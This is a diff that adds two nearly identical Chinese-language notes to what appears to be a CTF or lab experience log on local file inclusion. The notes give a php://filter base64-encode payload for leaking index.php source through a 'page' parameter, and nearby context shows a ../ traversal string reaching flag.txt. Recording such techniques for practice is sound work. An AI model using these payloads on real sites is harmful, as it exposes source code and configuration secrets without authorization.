@@ -28,6 +28,58 @@ mmm/../../../../../../../../flag.txt
 
 ---
 
+---
+doc_kind: experience
+type: lfi
+created: 2026-03-29
+tags: [lfi, php://filter, base64]
+---
+
+## php://filter/base64编码读取源码
+
+### 核心 bypass
+**php://filter/base64编码读取源码**
+
+### 原理
+- 参数 page=xxx 存在文件包含
+
+### 关键 payload
+```bash
+?page=php://filter/convert.base64-encode/resource=index.php
+```
+
+### 失败记录
+- php://filter 读取 base64 编码内容
+
+---
+
+---
+doc_kind: experience
+type: lfi
+created: 2026-03-29
+tags: [lfi, php://filter, base64]
+---
+
+## php://filter/base64编码 读取源码
+
+### 核心 bypass
+**php://filter/base64编码 读取源码**
+
+### 原理
+- 参数 page=xxx 存在文件包含
+- 使用 php://filter 将文件内容 base64 编码输出
+
+### 关键 payload
+```bash
+?page=php://filter/convert.base64-encode/resource=index.php
+```
+
+### 失败记录
+- ../ 路径遍历
+- file:// 协议
+
+---
+
 ## 2026-03-28 | https:
 ### 靶机环境
 - db.php 包含数据库配置信息
